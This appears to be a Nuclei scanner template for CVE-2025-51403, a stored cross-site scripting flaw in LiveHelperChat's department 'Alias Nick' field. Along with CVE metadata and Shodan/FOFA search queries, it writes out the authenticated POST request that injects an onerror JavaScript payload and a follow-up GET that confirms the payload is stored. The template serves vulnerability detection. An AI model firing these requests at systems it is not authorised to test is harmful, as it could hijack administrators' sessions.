id: CVE-2025-51403
info:
  name: Stored XSS in LiveHelperChat (Alias Nick)
  author: xx
  severity: high
  description: |
    Stored XSS via the Alias Nick field in the department assignment module of LiveHelperChat (versions <= 4.60). A low-privileged operator injects a malicious JavaScript payload into the Department Assignment "Alias Nick" field while assigning or editing department access. When a higher-privileged user (e.g., admin) edits the department assignment "Alias Nick" field, the stored script is executed in their browser context.
  tags: xss, stored, livehelperchat

reference:
  - https://github.com/Thewhiteevil/CVE-2025-51403
  - https://github.com/LiveHelperChat/livehelperchat/pull/2228/commits/2056503ad96e04467ec9af8d827109b9b9b46223
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2025-51403
  cwe-id: CWE-79
  epss-score: 0.00031
  epss-percentile: 0.0
  cpe: cpe:2.3:a:livehelperchat:livehelperchat:4.60:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: livehelperchat
  product: livehelperchat
  shodan-query: http.html:"livehelperchat"
  fofa-query: body="livehelperchat"
tags: cve,cve2025,xss,stored,livehelperchat,authenticated

variables:
  alias_nick_payload: '<img src="x" onerror="prompt(document.domain);">'

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php/site_admin/user/newdepartment/1/(editor)/self"
    headers:
      X-Requested-With: "XMLHttpRequest"
      User-Agent: "Mozilla/5.0"
      Cookie: "{{cookie}}"
      X-CSRFToken: "{{csrf_token}}"
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDJPMvw4u4gvM4JHH
    body: |
      ------WebKitFormBoundaryDJPMvw4u4gvM4JHH
      Content-Disposition: form-data; name="alias_nick"

      {{alias_nick_payload}}
      ------WebKitFormBoundaryDJPMvw4u4gvM4JHH--
    matchers:
      - type: word
        words:
          - '{{alias_nick_payload}}'
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/index.php/site_admin/user/editdepartment/1/1"
    headers:
      X-Requested-With: "XMLHttpRequest"
      User-Agent: "Mozilla/5.0"
      Cookie: "{{cookie}}"
    matchers:
      - type: word
        words:
          - '{{alias_nick_payload}}'
        part: body